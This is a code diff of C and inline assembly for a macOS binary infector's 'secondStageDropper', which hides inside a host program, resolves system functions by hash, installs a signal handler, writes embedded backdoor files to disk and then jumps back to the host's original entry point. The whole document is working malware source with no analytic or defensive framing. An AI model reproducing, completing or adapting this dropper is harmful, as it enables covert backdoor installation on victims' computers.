@@ -966,30 +966,22 @@ void labelTest ()
 {
 }
 
-void secondStageDropper ()
+void secondStageDropper (unsigned long args)
 {
-	//unsigned int dlsymAddress;
+	hijack_context *h_context = (hijack_context *)&args;
 	unsigned int fd;
-#ifdef WIN32
-	unsigned int _eax;
-	unsigned int _ebx;
-	unsigned int _ecx;
-	unsigned int _edx;
-	unsigned int _edi;
-	unsigned int _esi;
-	unsigned int _ebp;
-	unsigned int _esp;
-#endif
-	/*
-	unsigned char crtStart[] = "\x6a\x00\x89\xe5\x83\xe4\xf0\x83\xec"
-	"\x10\x8b\x5d\x04\x89\x5c\x24\x00\x8d"
-	"\x4d\x08\x89\x4c\x24\x04\x83\xc3\x01"
-	"\xc1\xe3\x02\x01\xcb\x89\x5c\x24\x08"
-	"\x8b\x03\x83\xc3\x04\x85\xc0\x75\xf7"
-	"\x89\x5c\x24\x0c\xe8\x90\x90\x90";
-	*/
-	int crtStartSize = 54;
 
+#ifdef WIN32
+	unsigned long _eax = h_context->eax;
+	unsigned long _ecx = h_context->ecx;
+	unsigned long _edx = h_context->edx;
+	unsigned long _ebx = h_context->ebx;
+	unsigned long _esp = h_context->esp;
+	unsigned long _ebp = h_context->ebp;
+	unsigned long _esi = h_context->esi;
+	unsigned long _edi = h_context->edi;
+#endif
+	int crtStartSize = 54;
 	const char *imageName   = NULL;
 	void *baseAddress       = NULL;
 	void *libSystemAddress  = NULL;
@@ -997,96 +989,9 @@ void secondStageDropper ()
 	int imageCount, z       = 0;
 	void *infectionBase     = NULL;
 
-
-	//int isASLR			  = 0;
-
-	//
-	// Save register state in order to avoid a crash jumping in the real crt start
-	//
 #ifdef WIN32
-	__asm__ __volatile__ {
-		mov [_eax], eax
-		mov [_ebx], ebx
-		mov [_ecx], ecx
-		mov [_edx], edx
-		mov [_edi], edi
-	}
-
-	__asm__ __volatile__ {
-		mov [_esi], esi
-		mov [_ebp], ebp
-		mov [_esp], esp
-		sub esp, 0x8 // fixing misaligned stack on fork
-	}
-	//__asm__ __volatile__ { int 0x3 }
-	_esp += 0x1c4 + 0x28; // restoring esp
-	_esp -= 0x80;         // Magic Number (depends on stack allocated vars)
-	_esp -= 0x14;
-#else
-	unsigned int	eax;
-	unsigned int	ecx;
-	unsigned int	edx;
-	unsigned int	edi;
-	unsigned int	esi;
-	unsigned int	ebp;
-	unsigned int	esp;
-
-	__asm__ __volatile__ (
-		"movl %%eax, %0\n"
-		"movl %%ecx, %1\n"
-		"movl %%edx, %2\n"
-		"movl %%edi, %3\n"
-		: "=m"(eax), "=m"(ecx), "=m"(edx), "=m"(edi)
-		:
-	);
-
-	__asm__ __volatile__ (  
-		"movl %%esi, %0\n"
-		"movl %%ebp, %1\n"
-		"movl %%esp, %2\n"
-		: "=m"(esi), "=m"(ebp), "=m"(esp)
-		:
-	);
-
-	esp += 0x1c4 + 0x28; // restoring esp
-#endif
-
-	//
-	// Grab base address for the infection header
-	// and randomized dyld base address
-	//
-#ifdef WIN32
-/*
-	__asm__ __volatile__ {
-		nop
-		nop
-		nop
-		nop
-		nop
-		mov eax, [ebp+0x4]
-		sub eax, 0xD2
-		mov [infectionBase], eax // infection header
-		mov eax, [ebp-0x8] // image base
-		cmp eax, 0x0 // if zero we are on 10.5/10.6
-		jne lion
-		mov eax, [ebp-0xc] // image base on leopard
-lion:
-		mov [baseAddress], eax
-		mov eax, [ebp-0x5c]
-		and eax, 0xFFF00000
-		cmp eax, 0x8FE00000 // if zero or different than 0x8FE we are on 10.5/10.6
-		je dyld_randomized
-		mov [dyldBaseAddress], 0x8FE00000
-		jmp done
-dyld_randomized:
-		mov eax, [ebp-0x5c]
-		sub eax, 0x12ef
-		mov [dyldBaseAddress], eax
-done:
-	}
-*/
-
-
+	sigaction new_act = {0};
+	sigaction old_act = {0};
 	u32_sigaction sig = {0};
 	unsigned int sig_handler;	
 	unsigned char file_buffer[1024];
@@ -1096,14 +1001,8 @@ done:
 
 	__asm__ __volatile__ {
 		mov eax, [ebp+0x4]
-		sub eax, 0xD2
+		sub eax, 0xD3
 		mov [infectionBase], eax
-		mov eax, [ebp-0x8]
-		cmp eax, 0x0
-		jne base
-		mov eax, [ebp-0xc]
-base:
-		mov [baseAddress], eax
 
 		jmp get_pc
 init:
@@ -1112,22 +1011,53 @@ init:
 		jmp l_out
 get_pc:
 		call init
+
 sig_handler:
-		sub DWORD PTR [esp+0x60], 0x4
-		mov eax, DWORD PTR [esp+0x60]
-		mov ebx, DWORD PTR [esp+0x6c]
+		mov eax, esp
+sig_loop:
+		add eax, 0x4
+		cmp [eax], ebp
+		jne sig_loop
+
+		add eax, 0x4
+		mov esp, eax
+	
+		sub [esp], 4		// make room for retaddr
+		mov eax, [esp]		// eax == faulting esp
+
+		mov ebx, [esp+0xc]	// eax == faulting EIP
+		add ebx, 8			// add to EIP
+		mov [eax], ebx		// save retaddr
+		
+		mov eax, [esp-0x1c]
+		mov ebx, [esp-0x18]
+		mov ecx, [esp-0x14]
+		mov edx, [esp-0x10]
+		mov esi, [esp-0xc]
+		mov edi, [esp-0x8]
+		mov ebp, [esp-0x4]
+		mov esp, [esp]
+		ret
+
+/*
+
+		sub DWORD PTR [esp+0x54], 0x4
+		mov eax, DWORD PTR [esp+0x54]
+		mov ebx, DWORD PTR [esp+0x60]
 		add ebx, 0x8
 		mov DWORD PTR [eax], ebx
 
-		mov eax, [esp+0x44]
-		mov ebx, [esp+0x48]
-		mov ecx, [esp+0x4c]
-		mov edx, [esp+0x50]
-		mov esi, [esp+0x54]
-		mov edi, [esp+0x58]
-		mov ebp, [esp+0x5c]
-		mov esp, [esp+0x60]
+		mov eax, [esp+0x38]
+		mov ebx, [esp+0x3c]
+		mov ecx, [esp+0x40]
+		mov edx, [esp+0x44]
+		mov esi, [esp+0x48]
+		mov edi, [esp+0x4c]
+		mov ebp, [esp+0x50]
+		mov esp, [esp+0x54]
 		ret
+*/
+
 l_out:
 	}
 
@@ -1166,28 +1096,28 @@ l_break:
 	// find macosx version
 	__asm__ __volatile__ {
 		push 0x0
-		push 0x7473696c
-		push 0x702e6e6f
-		push 0x69737265
-		push 0x566d6574
-		push 0x7379532f
-		push 0x73656369
-		push 0x76726553
-		push 0x65726f43
-		push 0x2f797261
-		push 0x7262694c
-		push 0x2f6d6574
-		push 0x7379532f	// "/System/Library/CoreServices/SystemVersion.plist"
-		mov eax, esp
+			push 0x7473696c
+			push 0x702e6e6f
+			push 0x69737265
+			push 0x566d6574
+			push 0x7379532f
+			push 0x73656369
+			push 0x76726553
+			push 0x65726f43
+			push 0x2f797261
+			push 0x7262694c
+			push 0x2f6d6574
+			push 0x7379532f	// "/System/Library/CoreServices/SystemVersion.plist"
+			mov eax, esp
 
-		push 0x0
-		push eax
-		mov eax, 0x5
-		push eax
-		int 0x80
-		mov [file_handle], eax
+			push 0x0
+			push eax
+			mov eax, 0x5
+			push eax
+			int 0x80
+			mov [file_handle], eax
 
-		add esp, 0x40
+			add esp, 0x40
 	}
 
 	if(file_handle <= 0)
@@ -1195,17 +1125,17 @@ l_break:
 
 	__asm__ __volatile__ {
 		push 0x400
-		lea eax, [file_buffer]
+			lea eax, [file_buffer]
 		push eax
-		mov eax, [file_handle]
+			mov eax, [file_handle]
 		push eax
-		mov eax, 0x3
+			mov eax, 0x3
 
-		push eax
-		int 0x80
-		mov [read_len], eax
+			push eax
+			int 0x80
+			mov [read_len], eax
 
-		add esp, 0x10
+			add esp, 0x10
 	}
 
 	if(read_len <= 0)
@@ -1287,6 +1217,7 @@ l_break:
 	unsigned int mallocHash   = 0x7de19fc7; // _malloc
 	unsigned int freeHash     = 0xf6f66e2b; // _free
 	unsigned int sleepHash    = 0x90a80b98; // _sleep
+	unsigned int sigactionHash = 0xa5bdf188; // _sigaction
 
 	//
 	// dyld function pointer prototypes
@@ -1319,6 +1250,7 @@ l_break:
 	void *(*imalloc)   (int);
 	void  (*ifree)     (void *);
 	unsigned int (*isleep) (unsigned int);
+	int (*isigaction)	(int sig, sigaction *act, sigaction *oact);
 
 	void *libdyldAddress    = mapLibDyld();
 	void *libsystemcAddress = mapLibSystemC();
@@ -1326,15 +1258,10 @@ l_break:
 
 	unsigned int imageBase  = (unsigned int)dyldBaseAddress;
 
-	//if ((unsigned int)dyldBaseAddress == (DYLD32_IMAGE_BASE << 20))
 	if (osx_version == 1)
-	{
 		_idyld_image_count = (uint32_t (__cdecl*)(void))(findSymbol_snow((byte *)imageBase, dyld_image_countHash));
-	}
 	else
-	{
 		_idyld_image_count = (uint32_t (__cdecl*)(void))(findSymbol_lion((byte *)imageBase, dyld_image_countHash));
-	}
 
 	if ((int)_idyld_image_count != -1)
 	{
@@ -1343,7 +1270,6 @@ l_break:
 #ifdef LOADER_DEBUG
 		printf ("[ii] imageCount: %d\n", imageCount);
 #endif
-		//if ((unsigned int)dyldBaseAddress == (DYLD32_IMAGE_BASE << 20))
 		if (osx_version == 1)
 		{
 			_idyld_get_image_name = (const char *(__cdecl *)(uint32_t))
@@ -1363,7 +1289,6 @@ l_break:
 
 		if ((int)_idyld_get_image_name != -1)
 		{
-			//if ((unsigned int)dyldBaseAddress == (DYLD32_IMAGE_BASE << 20))
 			if (osx_version == 1)
 			{
 				// We are on Leopard / Snow Leopard
@@ -1406,6 +1331,7 @@ l_break:
 							imalloc   = (void *(__cdecl *)(int))(findSymbolInFatBinary ((byte *)libSystemAddress, mallocHash) + (unsigned int)m_header);
 							ifree     = (void  (__cdecl *)(void *))(findSymbolInFatBinary ((byte *)libSystemAddress, freeHash) + (unsigned int)m_header);
 							isleep    = (unsigned int (__cdecl *)(unsigned int))(findSymbolInFatBinary ((byte *)libSystemAddress, sleepHash) + (unsigned int)m_header);
+							isigaction = (int (__cdecl *)(int, sigaction *, sigaction *))(findSymbolInFatBinary ((byte *)libSystemAddress, sigactionHash) + (unsigned int)m_header);
 						}
 
 						break;
@@ -1460,12 +1386,16 @@ l_break:
 						imalloc   = (void *(__cdecl *)(int))(findSymbolInFatBinary ((byte *)libsystemcAddress, mallocHash) + (unsigned int)m_header);
 						ifree     = (void  (__cdecl *)(void *))(findSymbolInFatBinary ((byte *)libsystemcAddress, freeHash) + (unsigned int)m_header);
 						isleep    = (unsigned int (__cdecl *)(unsigned int))(findSymbolInFatBinary ((byte *)libsystemcAddress, sleepHash) + (unsigned int)m_header);
+						isigaction = (int (__cdecl *)(int, sigaction *, sigaction *))(findSymbolInFatBinary ((byte *)libsystemcAddress, sigactionHash) + (unsigned int)m_header);
 					}
 				}
 			}
 
+			// first restore signal handler
+			new_act.sig_action = 0; // SIG_DFL
+			isigaction(0xb, &new_act, &old_act);
 #ifndef LOADER_DEBUG
-			for (i = 0; i < infection->numberOfStrings; i++)
+			for (i = 0; i < infection->numberOfStrings; i++)	
 			{
 				strings[i] = stringList->value;
 				offset += sizeof (stringTable);
@@ -1476,7 +1406,7 @@ l_break:
 				+ sizeof (infectionHeader)
 				+ sizeof (stringTable) * infection->numberOfStrings
 				+ infection->dropperSize
-				+ crtStartSize;
+				+ crtStartSize + 1;
 
 			void *envVariableName = (char *)strings[0];
 
@@ -1502,6 +1432,7 @@ l_break:
 			{
 				char *destinationPath = (char *) imalloc (256);
 				destinationDir = (char *) imalloc (128);
+
 				resource = (resourceHeader *)offset;
 				isprintf (destinationDir, strings[2], backdoorDropPath, resource->path);
 
@@ -1567,36 +1498,32 @@ l_break:
 				}
 			}
 
-			//__asm__ __volatile__ { int 0x3 }
 			ifree (backdoorDir);
 			ifree (backdoorPath);
 
-			//
-			// Restore register state and jump to the original entrypoint
-			//
 OEP_CALL:
 #ifdef WIN32
 			// Here we have to remove the fixed base (0x1000) and add
-			// the randomized one (dyldBaseAddress)
-			//uint32_t originalEP = infection->originalEP - 0x1000 + (uint32_t)dyldBaseAddress;
+			// the randomized one (dyldBaseAddress)			
+			uint32_t baseAddress = (uint32_t)_idyld_get_image_header(0);
 			uint32_t originalEP = infection->originalEP - 0x1000 + (uint32_t)baseAddress;
+
+			//
+			// Restore register state and jump to the original entrypoint
+			// ebp will be disarded by the crt initializer, so we can use it for the jump
+			//
 			__asm__ __volatile__ {
-				mov eax, [originalEP]
-				//mov ebx, [dyldBaseAddress]
-				mov ebx, [baseAddress]
-				mov ecx, 0x0
-					mov edx, 0x0
+					mov eax, _eax
+					mov ecx, _ecx
+					mov edx, _edx
+					mov ebx, _ebx
+					mov esi, _esi
+					mov edi, _edi
+					mov esp, _esp
+					mov ebp, originalEP; 
+					jmp ebp
 			}
 
-			//__asm__ __volatile__ { int 0x3 }
-			__asm__ __volatile__ {
-				mov esp, [_esp]
-				add esp, 0x7C // Trick for esp changes
-					sub esp, 0x4  // Lion update
-					add esp, 0x8  // Lion update (realigning stack to 16 bytes)
-					mov ebp, 0
-					jmp eax
-			}
 #else
 			__asm__ __volatile__ (
 				"movl  %0, %%eax\n"
